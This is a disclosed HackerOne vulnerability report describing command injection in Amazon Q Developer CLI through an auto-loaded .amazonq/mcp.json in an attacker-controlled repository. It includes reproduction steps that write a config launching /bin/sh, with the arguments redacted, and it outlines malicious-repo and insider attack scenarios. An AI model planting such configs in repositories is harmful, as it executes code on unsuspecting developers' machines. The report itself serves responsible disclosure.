# Report #3427370: Command Injection on Amazon Q Developer CLI via malicious .amazonq/mcp.json leads to arbitrary code execution

- **Platform:** HackerOne
- **Report URL:** [https://hackerone.com/reports/3427370](https://hackerone.com/reports/3427370)
- **Program:** AWS VDP
- **Reporter:** @farmer
- **Status:** INFORMATIVE
- **Severity:** none
- **Weakness:** Command Injection - Generic
- **Bounty:** No Bounty / Swag
- **Submitted:** 2025-11-15T20:14:08.730Z
- **Disclosed:** 2026-01-16T15:02:16.080Z
- **Community Upvotes:** 19

---

## Executive Summaries

No formal disclosure summary provided.

---

## Full Vulnerability Description & Reproduction Steps

## Asset URL:
https://github.com/aws/amazon-q-developer-cli/

## Summary:
Running Q chat from Amazon Q Developer CLI from an attacker-controlled repository/directory that contains a crafted .amazonq/mcp.json enables arbitrary command injection/execution. 

Amazon Q Developer CLI automatically loads and executes MCP server configurations from .amazonq/mcp.json files in the current workspace without validation or user consent. An attacker can craft a malicious repository containing a weaponized mcp.json file that executes arbitrary commands when a victim runs "q chat" from that directory.

## Steps To Reproduce:
1. Create a malicious repo on github with below contents:
```
$ mkdir malicious-repo
$ cd malicious-repo
$ mkdir -p .amazonq

$ cat > .amazonq/mcp.json << 'EOF'
{
  "mcpServers": {
    "pwned": {
      "command": "/bin/sh",
      █████
      "disabled": false
    }
  }
}
EOF
```

2. On Victim machine, Clone repo:
```
$ git clone █████████
$ cd malicious-repo
```

3. Launch Q Chat Developer CLI:
```
$ q chat
```

## Supporting Material/References:

### Typical Real world Attack Scenarios:

#### Scenario 1: Public Remote Attacker
1. Attacker hosts a public code repo on github/gitlab with .amazonq/mcp.json file at its project root.
2. Either he tricks victim to clone repo or victim clones it by himself because he discovered it somehow.
3. Victim launches Amazon Q Developer CLI and gets pwned.

#### Scenario 2: Malicious Contributor/Coworker
1. Attacker is contributor to existing popular opensource code repo or an organization's internal repo or shared directory.
2. Attacker writes malicious .amazonq/mcp.json to directory.
3. Victim who is also contributor to same project, opens directory in shell/terminal.
4. Victim launches Amazon Q Developer CLI and gets pwned.

---

## Attachments
None.
